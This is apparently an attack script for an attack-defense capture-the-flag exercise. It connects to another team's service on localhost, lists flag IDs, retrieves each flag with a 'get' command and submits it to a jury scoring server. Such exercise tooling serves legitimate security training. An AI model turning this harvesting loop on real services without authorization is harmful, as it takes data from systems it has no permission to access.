#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import uuid
import socket
import time
import os
import json

def send_flag(your_teamnum, jury_host, jury_port, flag):
    global requests
    url = 'http://' + jury_host + ':' + str(jury_port) + '/flag?teamid=' + str(your_teamnum) + '&flag=' + flag
    try:
        r = requests.get(url)
        print("Try send flag " + flag)
        ret = "?"
        if r.status_code != 200:
            ret = "FAIL " + r.text
        else:
            ret = "OK"
        print(ret)
        return ret
    except:
        print ("Could not connect to jury " + url)
    return None

def get_flag(ip_address, port, flag_id):
    try:
        # print("try connect " + host + ":" + str(port))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.2)
        s.connect((ip_address, port))
        result = s.recv(1024).decode("utf-8")
        # print(result)
        s.send("get\n".encode())
        result = s.recv(1024).decode("utf-8")
        s.send(str(flag_id + "\n").encode())
        result = s.recv(1024).decode("utf-8")
        flag2 = result.strip()
        flag2 = flag2.split("FOUND FLAG: ")
        if len(flag2) == 2:
            flag2 = flag2[1]
        else:
            flag2 = ''
        s.close()
        return flag2
    except socket.timeout:
        print("socket.timeout")
    except socket.error as serr:
        print(serr)
    except Exception as e:
        print(e)
    return ''


def start(your_teamnum, jury_host, jury_port, team_name, ip_address, port):
    print("Start attack to " + team_name + " (" + ip_address + ":" + str(port) + ")")
    flag_ids = []

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip_address, port))
        result = s.recv(1024).decode("utf-8")
        # print(result)
        s.send("list\n".encode())
        result = ""
        result1 = s.recv(1024).decode("utf-8")
        while result1.strip() != "":
            result1 = s.recv(1024).decode("utf-8")
            if result1.strip() == "":
                break
            result = result + result1
        s.close()

        result = result.split('\n')
        for i in result:
            flag_id = i.split(":")[1].strip()
            flag_ids.append(flag_id)
    except socket.timeout:
        print("Socket timeout")
    except socket.error as serr:
        print(serr)
    except Exception as e:
        print(e)

    prev_flags = {}
    filename = "found_flags.json"
    if os.path.isfile(filename):
        with open(filename, "r") as _file:
            prev_flags = json.load(_file)

    for flag_id in flag_ids:
        flag = get_flag(ip_address, port, flag_id)
        if flag in prev_flags:
            continue
        print(flag_id + ": " + flag)
        if flag != '':
            ret = send_flag(your_teamnum, jury_host, jury_port, flag)
            if ret is not None:
                prev_flags[flag] = ret

    with open(filename, 'w', encoding='utf-8') as _file:
        json.dump(prev_flags, _file, ensure_ascii=False, indent=4)

    # flag = str(uuid.uuid4())
    # send_flag(your_teamnum, jury_host, jury_port, flag)

jury_host = "localhost"
jury_port = 8080

your_teamnum = "t06"

# your team
team_name = "t01"

# attacking server
ip_address = "127.0.0.1"
port = 4101

start(your_teamnum, jury_host, jury_port, team_name, ip_address, port)